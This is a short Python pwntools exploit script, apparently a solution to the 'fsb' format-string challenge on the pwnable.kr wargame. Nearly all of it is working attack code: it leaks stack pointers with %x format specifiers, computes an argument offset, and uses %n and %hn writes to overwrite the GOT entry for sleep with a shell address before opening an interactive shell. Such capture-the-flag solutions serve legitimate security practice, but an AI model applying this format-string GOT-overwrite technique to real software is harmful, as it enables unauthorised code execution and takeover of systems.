#!/usr/bin/python
from pwn import *
# context.log_level = 'debug'
p = process('fsb')
# p = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')
sleep_got = 0x0804a008
shell     = 0x080486ab
raw_input("#####################1########################")
payload = "%14$08x%18$08x"
p.recvuntil('(1)\n')
p.sendline(payload)
esp = int(p.recv(8),16) - 0x50
ebp = int(p.recv(8),16)
offset = (ebp - esp) / 4
log.success("esp = " + hex(esp))
log.success("ebp = " + hex(ebp))
log.success("offset = " + str(offset))
raw_input("#####################2########################")
payload = "%%%dc"%(sleep_got) + "%18$n"
print payload
p.recvuntil('(2)\n')
p.sendline(payload)
raw_input("#####################3########################")
payload = ("%%%dc"%(shell&0xffff)) + "%%%d$hn"%(offset)
print payload
#p.recvuntil('(3)\n')
sleep(3)
p.sendline(payload)

raw_input("#####################4########################")

payload = "AAAAAAAA"
# p.recvuntil('(4)\n')     #这句话省略的话就出问题了.....
p.sendline(payload)

raw_input("#####################x########################")
sleep(4)
p.interactive()
